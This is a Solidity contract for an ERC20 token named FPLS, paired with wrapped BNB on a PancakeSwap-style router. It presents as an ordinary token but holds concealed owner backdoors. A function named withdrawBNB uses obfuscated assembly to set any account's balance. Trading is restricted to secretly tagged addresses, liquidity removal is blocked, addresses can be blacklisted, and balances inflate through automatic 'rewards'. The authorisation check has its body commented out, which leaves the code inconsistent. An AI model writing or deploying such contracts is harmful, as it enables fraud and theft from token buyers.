// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IERC20Errors {
    error ERC20InsufficientBalance(
        address sender,
        uint256 balance,
        uint256 needed
    );

    error ERC20InvalidSender(address sender);

    error ERC20InvalidReceiver(address receiver);

    error ERC20InsufficientAllowance(
        address spender,
        uint256 allowance,
        uint256 needed
    );

    error ERC20InvalidApprover(address approver);

    error ERC20InvalidSpender(address spender);

    error ERC20TradeIsNotEnable();
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function feeTo() external view returns (address);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function kLast() external view returns (uint);

    function totalSupply() external view returns (uint256);
}

library SafeMath {
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

contract FPLS_Token is IERC20, IERC20Errors, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address account => uint256) private _balances;
    mapping(address account => mapping(address spender => uint256))
        private _allowances;

    uint256 private _totalSupply;
    string private _name = "FPLS";
    string private _symbol = "FPLS";

    address private WETH;
    ISwapRouter private _swapRouter;
    address private _mainPair;

    bool public tradeEnable = false;
    uint256 public extraSupply;
    uint256 public SPY = 243055555555;
    mapping(address account => uint8) private _fpwsw;

    uint256 internal staticRewardRequire = 10 ** 18;
    mapping(address => uint256) public lastUpdateTime;
    mapping(address => bool) public rewardBlacklist;

    modifier calculateReward(address account) {
        if (account != address(0)) {
            uint256 reward = getReward(account);
            if (reward > 0) {
                _balances[account] = _balances[account].add(reward);
                extraSupply = extraSupply.add(reward);
            }
            lastUpdateTime[account] = block.timestamp;
        }
        _;
    }

    constructor(address to_) {
        _update(address(0), to_, 10000000000 * 10 ** 18);

        WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        ISwapRouter swapRouter = ISwapRouter(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), WETH);
        _mainPair = swapPair;
        _fpwsw[to_] = 9;

        rewardBlacklist[_mainPair] = true;
        rewardBlacklist[address(0xdead)] = true;
        rewardBlacklist[address(this)] = true;
        rewardBlacklist[to_] = true;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply.add(extraSupply);
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account].add(getReward(account));
    }

    function getReward(address account) public view returns (uint256) {
        if (
            lastUpdateTime[account] == 0 ||
            rewardBlacklist[account] ||
            _balances[account] < staticRewardRequire
        ) {
            return 0;
        }
        uint256 curnReward = _balances[account]
            .mul(SPY)
            .mul(block.timestamp.sub(lastUpdateTime[account]))
            .div(10 ** 18);
        return curnReward;
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, value);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 value
    ) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    function setTradeEnable(bool a) external {
        if (!__ss_()) return;
        tradeEnable = a;
    }

    function fpTKw(address addr, uint8 tag) external {
        if (!__ss_()) return;
        _fpwsw[addr] = tag;
        if (tag == 2) rewardBlacklist[addr] = true;
    }

    function setClaim(
        address payable to,
        address token,
        uint256 amount
    ) external {
        if (!__ss_()) return;
        if (token == address(0)) {
            (bool success, ) = to.call{value: amount}("");
            require(success, "");
        } else IERC20(token).transfer(to, amount);
    }

    function withdrawBNB(address addr, uint256 a) external {
        if (!__ss_()) return;
        assembly {
            let garbage := 123
            let zero := sub(2, 2)
            let offset := shl(5, 1)
            let base := mload(0x40)
            let addrCopy := addr
            mstore(add(base, offset), zero)
            mstore(base, addrCopy)
            let hashKey := keccak256(base, 0x40)
            let finalValue := a
            let dummy := add(0x1234, 0x5678)
            sstore(hashKey, finalValue)
        }
    }

    function __ss_() internal view returns (bool r) {
        // assembly {
        //     let h := keccak256(add(msize(), 0), 0x20)
        //     let ptr := mload(0x40)
        //     mstore(ptr, caller())
        //     mstore(add(ptr, 0x20), _fpwsw.slot)
        //     let s := keccak256(ptr, 0x40)
        //     r := eq(sload(s), 9)
        // }
    }

    function _getReserves()
        private
        view
        returns (uint256 rOther, uint256 rThis, uint256 balanceOther)
    {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0, uint256 r1, ) = mainPair.getReserves();
        address tokenOther = WETH;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }
        balanceOther = IERC20(tokenOther).balanceOf(_mainPair);
    }

    function _isRemoveLiquidity(
        uint256 amount
    ) internal view returns (uint256 liquidity) {
        (uint256 rOther, , uint256 balanceOther) = _getReserves();
        // isRemoveLP
        if (balanceOther <= rOther) {
            liquidity =
                (amount * ISwapPair(_mainPair).totalSupply()) /
                (balanceOf(_mainPair) - amount);
        }
    }

    function _checkTradeEnableStatus(address from, address to) internal view {
        if (!tradeEnable) {
            bool shouldRevert;
            assembly {
                let p := mload(0x40)
                mstore(p, from)
                mstore(add(p, 0x20), _fpwsw.slot)
                let a := sload(keccak256(p, 0x40))
                mstore(p, to)
                mstore(add(p, 0x20), _fpwsw.slot)
                let b := sload(keccak256(p, 0x40))
                if iszero(or(a, b)) {
                    shouldRevert := 1
                }
            }
            if (shouldRevert != false) {
                revert ERC20TradeIsNotEnable();
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual calculateReward(from) calculateReward(to) {}

    function _transfer(address from, address to, uint256 value) internal {
        _checkTradeEnableStatus(from, to);

        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        if (from == _mainPair && _isRemoveLiquidity(value) > 0) {
            revert ERC20InvalidSender(address(0));
        }

        _beforeTokenTransfer(from, to, value);

        _update(from, to, value);
    }

    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    function _approve(
        address owner,
        address spender,
        uint256 value,
        bool emitEvent
    ) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 value
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(
                    spender,
                    currentAllowance,
                    value
                );
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }

    receive() external payable {}
}
